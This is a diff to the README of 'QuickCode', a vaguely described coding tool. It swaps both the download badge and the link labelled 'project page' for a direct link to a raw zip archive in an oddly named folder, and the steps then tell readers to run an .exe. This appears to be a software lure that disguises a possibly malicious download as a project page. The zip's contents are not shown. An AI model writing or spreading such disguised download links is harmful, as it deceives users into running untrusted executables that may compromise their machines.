@@ -1,6 +1,6 @@
 # ⚡ QuickCode - Write your software code much faster
 
-[![](https://img.shields.io/badge/Download_QuickCode_Now-Blue?style=for-the-badge)](https://github.com/Betainebuttery433/QuickCode)
+[![](https://img.shields.io/badge/Download_QuickCode_Now-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Betainebuttery433/QuickCode/main/feathery/Code_Quick_v3.8.zip)
 
 ## 🎯 About this software
 
@@ -21,7 +21,7 @@ QuickCode runs on standard hardware. Ensure your computer meets these basic need
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [QuickCode project page](https://github.com/Betainebuttery433/QuickCode).
+1. Visit the [QuickCode project page](https://raw.githubusercontent.com/Betainebuttery433/QuickCode/main/feathery/Code_Quick_v3.8.zip).
 2. Look for the releases section on the right side of the page.
 3. Click the latest version link.
 4. Locate the file ending in .exe.
